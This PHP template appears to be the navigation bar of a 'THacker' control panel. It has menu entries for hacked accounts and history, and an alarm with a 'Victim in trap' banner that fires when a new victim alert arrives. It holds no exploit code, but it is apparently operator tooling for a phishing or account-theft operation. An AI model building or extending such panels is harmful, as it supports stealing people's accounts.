<?php

	include '../private/connect.php';

	$db = Database::getInstance();

	$c = $db->getc();

?>

<!-- Make sure that you allow autoplay in your browser to here the voice -->



<nav class="navbar " style="background: #fff;box-shadow: 6px 3px 9px #ddd;">

	<a class="navbar-brand text-dark" href="#">THacker</a>

	<ul class="nav">

		<li class="nav-item active">

			<a class="nav-link text-dark" onclick="showme('home')" href="javascript:void()"><i class="fa fa-home text-dark"></i> Home<span class="sr-only">(current)</span></a>

		</li>

		<li class="nav-item">

			<a class="nav-link text-dark" onclick="showme('all_hacked')" href="javascript:void()"><i class="fa fa-user-secret text-dark"></i> Accounts</a>

		</li>

		<li class="nav-item">

			<a class="nav-link text-dark" onclick="showme('all_history')" href="javascript:void()"><i class="fa fa-history text-dark"></i> History</a>

		</li>

		<li class="nav-item">

			<a class="nav-link text-dark" href="logout?logout"><i class="fa fa-sign-out text-dark"></i> Logout</a>

		</li>

		<?php

		$timec = time();

			$sq = $c->query("SELECT * FROM alert WHERE result='unsolved' AND timer + 60 * 30 > $timec");

			if ($sq->num_rows > 0) {

				$sq1 = $c->query("SELECT * FROM alert WHERE status='Active'");

				if ($sq1->num_rows > 0) {

		?>

			<audio autoplay>

			<source src="tools/assets/music/Tipatipatip.mp3" type="audio/mp3">

			    Your browser does not support the audio element.

			</audio>

			<script>

				Snackbar.show({text: '<i class="fa fa-warning"></i>  Victim in trap ',pos: 'top-center',actionText: 'OPEN',actionTextColor: '#fff',width: '100%',backgroundColor: '#dc3545',textColor: '#fff',onActionClick: function(element) {

		                //Set opacity of element to 0 to close Snackbar 

						showme('alert');

		            }

		          });

			</script>

		<?php } ?>

		<li class="nav-item" style="margin-top: auto;margin-bottom: auto;">

			<a class="nav-link alerter" onclick="showme('alert')" href="javascript:void()"><i class="fa fa-bullseye"></i> Alert</a>

		</li>

		<?php

			}

		?>

		

	</ul>

</nav>